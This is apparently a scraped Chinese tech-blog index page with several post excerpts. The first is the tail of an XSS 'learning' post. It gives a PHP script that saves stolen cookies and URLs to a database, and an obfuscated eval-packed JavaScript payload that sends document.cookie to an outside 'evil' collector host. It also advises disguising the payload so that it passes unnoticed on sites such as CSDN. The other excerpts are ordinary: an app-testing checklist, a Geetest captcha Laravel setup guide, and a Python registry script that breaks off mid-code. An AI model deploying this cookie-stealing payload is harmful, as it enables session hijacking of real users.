class="string">"insert into cookies(url, content, time, js) values (?, ?, ?, ?)"</span>)) &#123;</span></span><br><span class="line"><span class="php">    $stmt-&gt;bind_param(<span class="string">"ssss"</span>, $url, $content, $time, $js);</span></span><br><span class="line"><span class="php">    $result = $stmt-&gt;execute();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($result) &#123;</span></span><br><span class="line"><span class="php">    	<span class="keyword">echo</span> <span class="string">"Collected Your Cookie &lt;br&gt;"</span> ;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'url:'</span>, $url, <span class="string">'&lt;br&gt;'</span>, <span class="string">'content:'</span>, $content;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其实就是获取了url，还有cookie内容，然后插入了数据库保存起来。 这样，每成功一个XSS，就可以成功捕获到某个网站的Cookie。</p>
                  <h2 id="混淆加密"><a href="#混淆加密" class="headerlink" title="混淆加密"></a>混淆加密</h2>
                  <p>其实将刚才的cookie.js贴到任意的网站都有可能引起XSS，比如CSDN。 为了防止JavaScript被看出来，可以利用在线加密网站加密。<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/js.aspx</a> 比如上面一段代码就被加密成这样，粘贴到控制台，就能成功获取Cookie了。</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'9 0=1.8(\'0\');0.a=\'c://b.5.7/3.4?6=\'+2(j.i.l)+\'&amp;k=\'+2(1.3);0.h=\'e:d\';1.g.f(0);'</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="string">'img|document|escape|cookie|php|cuiqingcai|url|com|createElement|var|src|evil|http|none|display|appendChild|body|style|location|window|content|href'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-09-28 01:21:22" itemprop="dateCreated datePublished" datetime="2016-09-28T01:21:22+08:00">2016-09-28</time>
                </span>
                <span id="/3133.html" class="post-meta-item leancloud_visitors" data-flag-title="Web安全学习一之XSS漏洞的利用" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>4.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>4 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3009.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Other <i class="label-arrow"></i>
                  </a>
                  <a href="/3009.html" class="post-title-link" itemprop="url">APP测试要点整理</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="1、冒烟测试"><a href="#1、冒烟测试" class="headerlink" title="1、冒烟测试"></a>1、冒烟测试</h2>
                  <h3 id="使用的工具"><a href="#使用的工具" class="headerlink" title="使用的工具"></a>使用的工具</h3>
                  <p>Monkey</p>
                  <h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3>
                  <p>（1） 编写adb.exe的Monkey命令。 （2） 通过logcat定位问题，保证软件的健壮性。</p>
                  <h3 id="1-1-内存泄漏测试"><a href="#1-1-内存泄漏测试" class="headerlink" title="1.1 内存泄漏测试"></a>1.1 内存泄漏测试</h3>
                  <p>关注app的启动时间，页面加载时间，主要功能占用的CPU，内存，流量，与同类产品比较是否有优势。工具：DDMS</p>
                  <h3 id="1-2-联机调试测试"><a href="#1-2-联机调试测试" class="headerlink" title="1.2 联机调试测试"></a>1.2 联机调试测试</h3>
                  <p>连接真机进入调试模式，测试业务流；通过Logcat记录个操作，将所有错误定位代码。</p>
                  <h3 id="1-3-外网测试"><a href="#1-3-外网测试" class="headerlink" title="1.3 外网测试"></a>1.3 外网测试</h3>
                  <p>要覆盖到WIFI\2G\3G、net\wap 、电信\移动\联网,所有组合进行测试</p>
                  <h2 id="2、安装、卸载测试"><a href="#2、安装、卸载测试" class="headerlink" title="2、安装、卸载测试"></a>2、安装、卸载测试</h2>
                  <h3 id="2-1-安装卸载"><a href="#2-1-安装卸载" class="headerlink" title="2.1 安装卸载"></a>2.1 安装卸载</h3>
                  <p>app安装、卸载、启动、运行、清除缓存/数据运行看看是否正常</p>
                  <h3 id="2-2-平台支持"><a href="#2-2-平台支持" class="headerlink" title="2.2 平台支持"></a>2.2 平台支持</h3>
                  <p>是否支持豌豆荚、91等主流辅助工具，及是否和第三方软件兼容。</p>
                  <h2 id="3、在线升级测试"><a href="#3、在线升级测试" class="headerlink" title="3、在线升级测试"></a>3、在线升级测试</h2>
                  <h3 id="3-1-在线升级安装及使用测试"><a href="#3-1-在线升级安装及使用测试" class="headerlink" title="3.1 在线升级安装及使用测试"></a>3.1 在线升级安装及使用测试</h3>
                  <p>（1）验证数字签名； （2）升级后是否可以正常使用； （3）在线夸版本升级。</p>
                  <h2 id="4、业务功能测试"><a href="#4、业务功能测试" class="headerlink" title="4、业务功能测试"></a>4、业务功能测试</h2>
                  <h3 id="4-1-业务逻辑测试"><a href="#4-1-业务逻辑测试" class="headerlink" title="4.1 业务逻辑测试"></a>4.1 业务逻辑测试</h3>
                  <p>运行app时，是否可以接电话，发短信，锁屏，充电等功能</p>
                  <h3 id="4-2-功能点测试"><a href="#4-2-功能点测试" class="headerlink" title="4.2 功能点测试"></a>4.2 功能点测试</h3>
                  <p>检查功能点是否正常，是否满足需求文档</p>
                  <h3 id="4-3-关联性测试"><a href="#4-3-关联性测试" class="headerlink" title="4.3 关联性测试"></a>4.3 关联性测试</h3>
                  <p>安装app后，是否和pc机连接，交互正常</p>
                  <h2 id="5、稳定性及异常性测试"><a href="#5、稳定性及异常性测试" class="headerlink" title="5、稳定性及异常性测试"></a>5、稳定性及异常性测试</h2>
                  <h3 id="5-1-交互性测试"><a href="#5-1-交互性测试" class="headerlink" title="5.1 交互性测试"></a>5.1 交互性测试</h3>
                  <p>手机被多种打扰，例如，打开微信，聊QQ，听音乐等，app是否运行正常；待机，插拔数据线等操作</p>
                  <h3 id="5-2-异常性测试"><a href="#5-2-异常性测试" class="headerlink" title="5.2 异常性测试"></a>5.2 异常性测试</h3>
                  <p>断点、断网异常情况，是否稳定</p>
                  <h2 id="6、性能测试"><a href="#6、性能测试" class="headerlink" title="6、性能测试"></a>6、性能测试</h2>
                  <h3 id="6-1-基准性能测试"><a href="#6-1-基准性能测试" class="headerlink" title="6.1 基准性能测试"></a>6.1 基准性能测试</h3>
                  <p>主要是写脚本，是否可以进行压力测试；在不同网络的情况下，运行速度变化情况。</p>
                  <h3 id="6-2-大数据量测试"><a href="#6-2-大数据量测试" class="headerlink" title="6.2 大数据量测试"></a>6.2 大数据量测试</h3>
                  <p>保证手机更新大数据量程序成功率</p>
                  <h2 id="7、界面易用性测试"><a href="#7、界面易用性测试" class="headerlink" title="7、界面易用性测试"></a>7、界面易用性测试</h2>
                  <h3 id="7-1-界面与交互性测试"><a href="#7-1-界面与交互性测试" class="headerlink" title="7.1 界面与交互性测试"></a>7.1 界面与交互性测试</h3>
                  <p>符合<a href="http://www.apkbus.com/" target="_blank" rel="noopener">安卓</a>交互规范；用户体验良好；使用方便。快捷</p>
                  <h3 id="7-2-可用性测试"><a href="#7-2-可用性测试" class="headerlink" title="7.2 可用性测试"></a>7.2 可用性测试</h3>
                  <p>可用性强，操作简单；使用操作错误率低；完成任务使用时间短</p>
                  <h2 id="8、自动化测试"><a href="#8、自动化测试" class="headerlink" title="8、自动化测试"></a>8、自动化测试</h2>
                  <p>CTS工具，主要是基于Androidinstrumentation和JUnit测试原理推单元测试用例； Monkey用来对UI进行压力测试，伪随机的模拟用户的按键输入，触摸屏输入，手势输入等； ASE工具，是调用Android的功能，从而定制一些测试，比如打电话，发短信，浏览网页等； Robotium工具，提供了模仿用户操作行为的API，比如在某个控件上点击，输入Text等等； MonkeyRunner工具，是调用一个Python脚本去安装一个Android应用程序或测试包，运行它，向它发送模拟按键，截取界面图片等 QQ交流群：369353583</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/路由新定" class="author" itemprop="url" rel="index">路由新定</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-08-02 09:57:22" itemprop="dateCreated datePublished" datetime="2016-08-02T09:57:22+08:00">2016-08-02</time>
                </span>
                <span id="/3009.html" class="post-meta-item leancloud_visitors" data-flag-title="APP测试要点整理" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>986</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2988.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> PHP <i class="label-arrow"></i>
                  </a>
                  <a href="/2988.html" class="post-title-link" itemprop="url">极验验证码(Geetest) Laravel 5 集成开发包, 滑动二维码让验证更安全</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2>
                  <p>在网站开发中使用频率最高的工具之一便是验证码，验证码在此也是多种多样，不过简单的图片验证码已经可以被机器识别，极验验证码提供了一个安全可靠的滑动验证码体系，让网站开发更加安全。 先感受一下这种验证码的魅力 <a href="http://www.geetest.com/exp_normal" target="_blank" rel="noopener">极验</a> 接入极验验证码的过程并没有想象中的那么简单，如果想在Laravel5中使用，可以使用Laravel5的极验验证码包 <a href="https://github.com/Germey/LaravelGeetest" target="_blank" rel="noopener">LaravelGeetest</a> 支持 Laravel 5.0 及以上版本。 地址： <a href="https://github.com/Germey/LaravelGeetest" target="_blank" rel="noopener">https://github.com/Germey/LaravelGeetest</a> 建议阅读原项目的README文件，最新的更新都会在README中说明，而且用法介绍是最全面的。 下面简单介绍一下该工具包的使用。</p>
                  <h2 id="注册极验账号"><a href="#注册极验账号" class="headerlink" title="注册极验账号"></a>注册极验账号</h2>
                  <p>首先需要到 <a href="http://www.geetest.com/" target="_blank" rel="noopener">极验</a> 网站注册账号，然后新建一个应用，获取到 ID 和 KEY，留作备用，后台管理页面如下。 <img src="https://ww1.sinaimg.cn/large/006tNbRwly1fcdsqp81loj31jw0oqmy1.jpg" alt=""></p>
                  <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2>
                  <p>在项目地址输入命令</p>
                  <figure class="highlight elixir">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="variable">$ </span>composer <span class="keyword">require</span> germey/geetest</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>就可以完成该包的安装 或者可以在 composer.json 的 require 中添加</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"germey/geetest"</span>: <span class="string">"~2.0"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后执行</p>
                  <figure class="highlight elixir">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="variable">$ </span>composer update</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>同样可以完成该包的安装。</p>
                  <h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2>
                  <p>注册 ServiceProvider，在 config/app.php 的 providers 中添加</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Germey\Geetest\GeetestServiceProvider::<span class="class"><span class="keyword">class</span></span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在 aliases 中添加</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">'Geetest'</span> =&gt; Germey\Geetest\Geetest::<span class="class"><span class="keyword">class</span></span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后执行</p>
                  <figure class="highlight elixir">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="variable">$ </span>php artisan <span class="symbol">vendor:</span>publish</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>会生成一个配置文件，config/geetest.php 和视图文件views/vendor/geetest，视图文件中你可以自定义配置，比如修改一下验证失败后的alert函数，修改为你想要的提示toast等。</p>
                  <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2>
                  <p>首先把刚才拿到的 ID 和 KEY 配置到 .env 文件中，因为这两个算私密内容，配置到 .env 文件中可以保证安全性。在 .env 中写入如下两行。</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">GEETEST_ID</span>=<span class="number">0</span>f1097bef7xxxxxx9afdeced970c63e4</span><br><span class="line"><span class="attr">GEETEST_KEY</span>=c070f0628xxxxxxe68e138b55c56fb3b</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 ID 和 KEY 换成你自己的。 然后，在任意的视图里，我们只需要调用</p>
                  <figure class="highlight erlang-repl">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;!! Geetest::render() !!&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>就可以得到验证码了。 比如我们最常用的表单里</p>
                  <figure class="highlight pgsql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&lt;form action="/" <span class="keyword">method</span>="post"&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="type">name</span>="_token" <span class="keyword">type</span>="hidden" <span class="keyword">value</span>="&#123;&#123; csrf_token() &#125;&#125;"&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span>="text" <span class="type">name</span>="name" placeholder="name"&gt;</span><br><span class="line">    &#123;!! Geetest::render() !!&#125;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span>="submit" <span class="keyword">value</span>="submit"&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>通过如上代码就可以完成验证码的生成了，样例如下： <img src="https://ww4.sinaimg.cn/large/006tNbRwly1fcdsbrinxaj30he05kjrd.jpg" alt=""> 另外还可以指定验证码的另外两种样式。</p>
                  <figure class="highlight erlang-repl">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;!! Geetest::render(<span class="string">'embed'</span>) !!&#125;</span><br><span class="line">&#123;!! Geetest::render(<span class="string">'popup'</span>) !!&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上两个方法分别会生成嵌入式和弹出式验证码。如果没有参数，默认是浮动式。 关于这几种样式，可以参考 <a href="http://www.geetest.com/exp_normal" target="_blank" rel="noopener">官网</a> 这样，就能保证必须完成验证码操作才能提交表单。 好，至此，你就可以完成最基础的验证码配置了。</p>
                  <h2 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h2>
                  <p>如果你完成了上面的部分，那么恭喜你已经成功了一大半了，可以到此为止，不过如果想更加安全，请继续往下看。 在此是服务端二次验证，在上面讲的方法是客户端的验证，但是这并不能代表绝对安全，一些恶意用户依然可以通过操作JS完成表单的提交，所以服务端我们需要再次验证一下。 在表单提交的时候，如果你用了极验，那么就会额外提交三个字段，分别是 geetest_challenge, geetest_validate, geetest_seccode, 利用这三个字段，我们可以重新核对操作是否合法。 在这里这个包又做了封装，提供了一条验证规则。 所以验证时我们只需要利用验证规则即可。</p>
                  <figure class="highlight php">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> Request $request</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">postValidate</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;validate($request, [</span><br><span class="line">      <span class="string">'geetest_challenge'</span> =&gt; <span class="string">'geetest'</span>,</span><br><span class="line">    ], [</span><br><span class="line">      <span class="string">'geetest'</span> =&gt; config(<span class="string">'geetest.server_fail_alert'</span>)</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">if</span> ($request) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>利用 validate 方法，通过验证其中一个字段 geetest_challenge, 验证规则 geetest 就可以完成服务端的验证。这样就更保证了安全性。 在这里注意，由于多提交了几个字段，如果想执行 ORM 的批量插入修改操作时，记得在 Model 里面屏蔽这几个字段</p>
                  <figure class="highlight lasso">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">protected</span> $guarded = <span class="meta">[</span><span class="string">'geetest_challenge'</span>, <span class="string">'geetest_validate'</span>, <span class="string">'geetest_seccode'</span><span class="meta">]</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>通过以上方法，就完成了服务端验证。 关于更多使用方法，可以参考 <a href="https://github.com/Germey/LaravelGeetest" target="_blank" rel="noopener">README</a></p>
                  <h2 id="语言设置"><a href="#语言设置" class="headerlink" title="语言设置"></a>语言设置</h2>
                  <p>验证码提供五种语言，简体中文，繁体中文，英文，日文，韩文。 可以通过 config/geetest.php 中设置 lang 字段。</p>
                  <ul>
                    <li>zh-cn (简体中文)</li>
                    <li>zh-tw (繁体中文)</li>
                    <li>en (英文)</li>
                    <li>ja (日文)</li>
                    <li>ko (韩文)</li>
                  </ul>
                  <h2 id="修改提示语"><a href="#修改提示语" class="headerlink" title="修改提示语"></a>修改提示语</h2>
                  <p>在这里有两个提示语，client_fail_alert 和 server_fail_alert ，分别是前端和后台（客户端和服务器）两边的提示语，可以通过设置 config/geetest.php 设置。</p>
                  <h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2>
                  <p>静觅（崔庆才） 个人主页：<a href="http://cuiqingcai.com">http://cuiqingcai.com</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-07-26 02:11:22" itemprop="dateCreated datePublished" datetime="2016-07-26T02:11:22+08:00">2016-07-26</time>
                </span>
                <span id="/2988.html" class="post-meta-item leancloud_visitors" data-flag-title="极验验证码(Geetest) Laravel 5 集成开发包, 滑动二维码让验证更安全" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.6k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2956.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2956.html" class="post-title-link" itemprop="url">python version 2. required,which was not found in the registry 解决方案</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>不能在注册表中识别python2.7 新建一个register.py 文件</p>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">from _winreg import *</span><br><span class="line"> </span><br><span class="line"># tweak <span class="keyword">as</span> necessary</span><br><span class="line">version = sys.version<span class="literal">[:<span class="number">3</span>]</span></span><br><span class="line">installpath = sys.prefix</span><br><span class="line"> </span><br><span class="line">regpath = <span class="string">"SOFTWARE\\Python\\Pythoncore\\%s\\"</span> % (version)</span><br><span class="line">installkey = <span class="string">"InstallPath"</span></span><br><span class="line">pythonkey = <span class="string">"PythonPath"</span></span><br><span class="line">pythonpath = <span class="string">"%s;%s\\Lib\\;%s\\DLLs\\"</span> % (</span><br><span class="line">    installpath, installpath, installpath</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">def <span class="constructor">RegisterPy()</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reg = <span class="constructor">OpenKey(HKEY_CURRENT_USER, <span class="params">regpath</span>)</span></span><br><span class="line">    except EnvironmentError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            reg = <span class="constructor">CreateKey(HKEY_CURRENT_USER, <span class="params">regpath</span>)</span></span><br><span class="line">            <span class="constructor">SetValue(<span class="params">reg</span>, <span class="params">installkey</span>, REG_SZ, <span class="params">installpath</span>)</span></span><br><span class="line">            <span class="constructor">SetValue(<span class="params">reg</span>, <span class="params">pythonkey</span>, REG_SZ, <span class="params">pythonpath</span>)</span></span><br><span class="line">            <span class="constructor">CloseKey(<span class="params">reg</span>)</span></span><br><span class="line">        except:</span><br><span class="line">            print <span class="string">"*** Unable to register!"</span></span><br><span class="line">            return</span><br><span class="line">        print <span class="string">"--- Python"</span>, version, <span class="string">"is now registered!"</span></span><br><span class="line">        return</span><br><span class="line">    <span class="keyword">if</span> (<span class="constructor">QueryValue(<span class="params">reg</span>, <span class="params">installkey</span>)</span><span class="operator"> == </span>installpath <span class="keyword">and</span></span><br><span class="line">        <span class="constructor">QueryValue(<span class="params">reg</span>, <span 